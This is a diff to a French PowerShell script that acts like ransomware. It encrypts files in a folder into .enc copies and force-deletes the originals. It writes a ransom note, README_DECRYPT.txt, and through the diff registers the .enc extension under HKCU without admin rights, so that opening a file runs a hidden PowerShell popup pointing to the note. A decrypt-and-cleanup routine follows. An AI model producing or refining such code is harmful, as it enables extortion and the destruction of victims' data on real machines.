@@ -23,9 +23,7 @@ foreach ($file in $files)
     $outputFile = $file.FullName + ".enc"
     [System.IO.File]::WriteAllBytes($outputFile, $result)
 
-    # Supprimer l'original
     Remove-Item $file.FullName -Force
-
     Write-Host "Chiffre :" $file.Name
 }
 
@@ -54,27 +52,29 @@ Lancez le script de dechiffrement et entrez le mot de passe.
 ----------------------------------------------------------
 "@
 
-$ransom | Out-File "$folder\README_DECRYPT.txt" -Encoding UTF8
-Write-Host ""
+$utf8Bom = New-Object System.Text.UTF8Encoding $true
+[System.IO.File]::WriteAllText("$folder\README_DECRYPT.txt", $ransom, $utf8Bom)Write-Host ""
 Write-Host "Note de rancon creee : README_DECRYPT.txt"
 
-# --- ASSOCIATION FICHIER .enc -> POPUP ---
-# Cree un script qui affiche le popup quand on ouvre un .enc
-$popupScript = @'
-param([string]$filePath)
+# --- ASSOCIATION .enc -> POPUP (registre HKCU, sans admin) ---
+$popupContent = @"
 Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.MessageBox]::Show(
-    "Ce fichier est chiffre.`n`nVeuillez lire la note de rancon :`nREADME_DECRYPT.txt",
+    "Ce fichier est chiffre.``n``nVeuillez lire la note de rancon :``nREADME_DECRYPT.txt",
     "Fichier Chiffre - Acces Refuse",
     [System.Windows.Forms.MessageBoxButtons]::OK,
     [System.Windows.Forms.MessageBoxIcon]::Warning
 )
-'@
-$popupScript | Out-File "$folder\open_enc.ps1" -Encoding UTF8
+"@
+$popupContent | Out-File "$folder\open_enc.ps1" -Encoding UTF8
 
-# Associer l'extension .enc a ce script PowerShell
-cmd /c "assoc .enc=EncryptedFile" | Out-Null
-cmd /c "ftype EncryptedFile=powershell.exe -WindowStyle Hidden -File `"$folder\open_enc.ps1`" `"%1`"" | Out-Null
+New-Item -Path "HKCU:\Software\Classes\.enc" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Classes\.enc" -Name "(Default)" -Value "EncryptedFile"
+
+New-Item -Path "HKCU:\Software\Classes\EncryptedFile\shell\open\command" -Force | Out-Null
+Set-ItemProperty -Path "HKCU:\Software\Classes\EncryptedFile\shell\open\command" `
+    -Name "(Default)" `
+    -Value "powershell.exe -WindowStyle Hidden -File `"$folder\open_enc.ps1`""
 
 Write-Host "Association .enc configuree (popup au double-clic)"
 Write-Host ""
@@ -107,22 +107,18 @@ foreach ($encFile in $encryptedFiles)
     $decryptor = $aes.CreateDecryptor()
     $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
 
-    # Restaurer le nom original exact (enlever juste .enc)
     $originalName = $encFile.FullName -replace '\.enc$', ''
     [System.IO.File]::WriteAllBytes($originalName, $decryptedData)
 
-    # Supprimer le .enc
     Remove-Item $encFile.FullName -Force
-
     Write-Host "Dechiffre :" $originalName
 }
 
-# Supprimer la note de rancon apres dechiffrement
+# --- NETTOYAGE ---
 Remove-Item "$folder\README_DECRYPT.txt" -Force -ErrorAction SilentlyContinue
 Remove-Item "$folder\open_enc.ps1" -Force -ErrorAction SilentlyContinue
-
-# Restaurer l'association .enc par defaut
-cmd /c "assoc .enc=" | Out-Null
+Remove-Item "HKCU:\Software\Classes\.enc" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item "HKCU:\Software\Classes\EncryptedFile" -Recurse -Force -ErrorAction SilentlyContinue
 
 Write-Host ""
 Write-Host "Tous les fichiers ont ete dechiffres et restaures."
